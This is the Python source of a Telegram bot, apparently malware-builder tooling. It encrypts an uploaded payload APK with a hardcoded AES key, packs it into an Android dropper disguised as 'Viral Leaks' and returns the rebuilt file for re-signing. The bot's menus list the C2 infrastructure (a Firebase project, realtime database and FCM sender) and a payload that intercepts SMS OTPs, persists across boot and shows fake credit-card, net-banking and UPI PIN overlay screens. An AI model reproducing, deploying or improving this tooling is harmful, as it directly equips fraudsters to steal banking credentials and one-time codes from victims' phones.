"""
APK Swapper Bot — Full version with menu
"""

import os, io, zipfile, secrets, logging, asyncio
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes
)

# ─── Config ───────────────────────────────────────────────────────────────────

BOT_TOKEN    = os.getenv("BOT_TOKEN", "")
DROPPER_PATH = Path(__file__).parent / "Viral_Leaks_dropper.apk"
AES_KEY_HEX  = "b7fcadb82c9ee0bf873c9c1b670285c22814b69201d01fe640cb2e409131b7f1"
AES_KEY      = bytes.fromhex(AES_KEY_HEX)
ASSET_NAME   = "assets/Axyra"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)
log = logging.getLogger(__name__)

# ─── State ────────────────────────────────────────────────────────────────────

# user_id → True means waiting for APK upload
awaiting_apk: set[int] = set()

# ─── Crypto ───────────────────────────────────────────────────────────────────

def encrypt_payload(data: bytes) -> bytes:
    iv = secrets.token_bytes(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(data, AES.block_size))

def rebuild_dropper(payload_bytes: bytes) -> bytes:
    encrypted = encrypt_payload(payload_bytes)
    buf = io.BytesIO()
    with zipfile.ZipFile(DROPPER_PATH, "r") as zin, \
         zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zout:
        for item in zin.infolist():
            if item.filename.startswith("META-INF/"):
                continue
            if item.filename == ASSET_NAME:
                zout.writestr(item, encrypted)
            else:
                zout.writestr(item, zin.read(item.filename))
    return buf.getvalue()

# ─── Keyboards ────────────────────────────────────────────────────────────────

def main_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📤  APK Upload karo", callback_data="upload")],
        [InlineKeyboardButton("🔑  AES Key dekho",   callback_data="key"),
         InlineKeyboardButton("ℹ️  Bot Info",        callback_data="info")],
        [InlineKeyboardButton("📋  Permissions list", callback_data="perms")],
    ])

# ─── Handlers ─────────────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    awaiting_apk.discard(user.id)
    await update.message.reply_text(
        f"👋 Welcome, {user.first_name}!\n\n"
        "🔧 *APK Swapper Bot*\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "Naya payload APK upload karo — main usse encrypt karke\n"
        "dropper ke andar Axyra replace kar dunga.\n\n"
        "📦 *Dropper:* `com.gdww.ihwc.hpfv`\n"
        "🔐 *Algo:* AES-256-CBC (IV prepended)\n"
        "📁 *Asset:* `assets/Axyra`\n\n"
        "Neeche menu se option chuno 👇",
        parse_mode="Markdown",
        reply_markup=main_menu_kb()
    )

async def cmd_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    awaiting_apk.discard(update.effective_user.id)
    await update.message.reply_text(
        "🏠 *Main Menu*\nOption chuno:",
        parse_mode="Markdown",
        reply_markup=main_menu_kb()
    )

async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data

    if data == "upload":
        awaiting_apk.add(uid)
        await q.message.reply_text(
            "📤 *APK Upload Mode*\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "Ab apna naya payload `.apk` file bhejo.\n\n"
            "⚙️ Main kya karunga:\n"
            "  1️⃣  File validate karunga (ZIP magic check)\n"
            "  2️⃣  AES-256-CBC se encrypt karunga\n"
            "  3️⃣  Random IV prepend karunga\n"
            "  4️⃣  Dropper ki `assets/Axyra` replace karunga\n"
            "  5️⃣  Naya dropper wapas bheejunga\n\n"
            "⚠️ *Note:* Install ke liye re-sign karna hoga.\n"
            "Cancel karne ke liye /menu",
            parse_mode="Markdown"
        )

    elif data == "key":
        await q.message.reply_text(
            "🔑 *Encryption Details*\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"*Algorithm:* `AES/CBC/PKCS5Padding`\n"
            f"*Key (256-bit):*\n`{AES_KEY_HEX}`\n\n"
            f"*IV:* Random 16 bytes, ciphertext ke pehle prepend hota hai\n"
            f"*Source:* Dropper DEX mein `AES_KEY_HEX` constant\n"
            f"*Asset:* `assets/Axyra`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Menu", callback_data="home")
            ]])
        )

    elif data == "info":
        dropper_size = DROPPER_PATH.stat().st_size // 1024 if DROPPER_PATH.exists() else 0
        status = "✅ Loaded" if DROPPER_PATH.exists() else "❌ Missing"
        await q.message.reply_text(
            "ℹ️ *Bot Info*\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"*Dropper file:* {status}\n"
            f"*Dropper size:* {dropper_size} KB\n"
            f"*Dropper pkg:* `com.gdww.ihwc.hpfv`\n"
            f"*Payload pkg:* `com.btmo.awws.hoag`\n\n"
            "*C2 Infrastructure:*\n"
            "  • Firebase: `toxicgen-f1d0c`\n"
            "  • RTDB: `toxicgen-f1d0c-default-rtdb`\n"
            "  • FCM Sender: `1086425822943`\n\n"
            "*Dropper Flow:*\n"
            "  Viral Leaks → Axyra decrypt → Install payload\n"
            "  → VpnBypassService → PackageInstaller",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Menu", callback_data="home")
            ]])
        )

    elif data == "perms":
        await q.message.reply_text(
            "📋 *Payload Permissions*\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "🔴 *Dangerous:*\n"
            "  • `READ_SMS` — OTP padho\n"
            "  • `RECEIVE_SMS` — SMS aane pe intercept\n"
            "  • `SEND_SMS` — SMS bhejo\n"
            "  • `CALL_PHONE` — Call karo\n"
            "  • `READ_PHONE_STATE` — Device info\n"
            "  • `READ_PHONE_NUMBERS` — Number padho\n\n"
            "🟡 *System:*\n"
            "  • `RECEIVE_BOOT_COMPLETED` — Boot persistence\n"
            "  • `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`\n"
            "  • `FOREGROUND_SERVICE`\n"
            "  • `POST_NOTIFICATIONS`\n\n"
            "🟢 *Network:*\n"
            "  • `INTERNET`\n"
            "  • `ACCESS_NETWORK_STATE`\n\n"
            "*Overlay Screens:*\n"
            "  💳 CreditCardActivity\n"
            "  🏦 NetBankingActivity\n"
            "  📱 UpiPinActivity",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Menu", callback_data="home")
            ]])
        )

    elif data == "home":
        awaiting_apk.discard(uid)
        await q.message.reply_text(
            "🏠 *Main Menu*",
            parse_mode="Markdown",
            reply_markup=main_menu_kb()
        )

async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    doc = update.message.document

    if uid not in awaiting_apk:
        await update.message.reply_text(
            "Pehle menu se *📤 APK Upload karo* dabao.",
            parse_mode="Markdown",
            reply_markup=main_menu_kb()
        )
        return

    if not doc.file_name.lower().endswith(".apk"):
        await update.message.reply_text("❌ Sirf `.apk` files.\nDobara bhejo ya /menu")
        return

    if not DROPPER_PATH.exists():
        await update.message.reply_text("❌ Dropper file missing: `Viral_Leaks_dropper.apk`", parse_mode="Markdown")
        return

    awaiting_apk.discard(uid)

    prog = await update.message.reply_text(
        f"⬇️ Download ho raha hai: `{doc.file_name}` ({doc.file_size // 1024} KB)...",
        parse_mode="Markdown"
    )

    tg_file = await ctx.bot.get_file(doc.file_id)
    apk_bytes = bytes(await tg_file.download_as_bytearray())

    if apk_bytes[:2] != b"PK":
        await prog.edit_text("❌ Invalid APK — ZIP magic nahi mila. Sahi file bhejo.\n/menu")
        return

    await prog.edit_text("🔐 Encrypt ho raha hai + Axyra replace...")

    try:
        new_dropper = rebuild_dropper(apk_bytes)
    except Exception as e:
        log.exception("rebuild failed")
        await prog.edit_text(f"❌ Error: {e}")
        return

    out_name = f"dropper_{doc.file_name}"
    await prog.edit_text(f"📤 Bhej raha hoon ({len(new_dropper) // 1024} KB)...")

    await update.message.reply_document(
        document=io.BytesIO(new_dropper),
        filename=out_name,
        caption=(
            f"✅ *Dropper ready!*\n\n"
            f"📦 Payload: `{doc.file_name}`\n"
            f"📏 Size: `{len(new_dropper) // 1024} KB`\n"
            f"🔐 Key: `{AES_KEY_HEX[:24]}...`\n\n"
            f"⚠️ *Install ke liye re-sign karo:*\n"
            f"`uber-apk-signer.jar --apks {out_name}`"
        ),
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 Aur ek APK", callback_data="upload"),
            InlineKeyboardButton("🏠 Menu",        callback_data="home"),
        ]])
    )
    await prog.delete()
    log.info("Sent rebuilt dropper %s (%d bytes) to uid=%d", out_name, len(new_dropper), uid)

# ─── Main ─────────────────────────────────────────────────────────────────────

async def post_init(app):
    await app.bot.set_my_commands([
        BotCommand("start", "Welcome screen"),
        BotCommand("menu",  "Main menu"),
    ])

def main():
    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .build()
    )
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu",  cmd_menu))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    log.info("Bot polling shuru...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
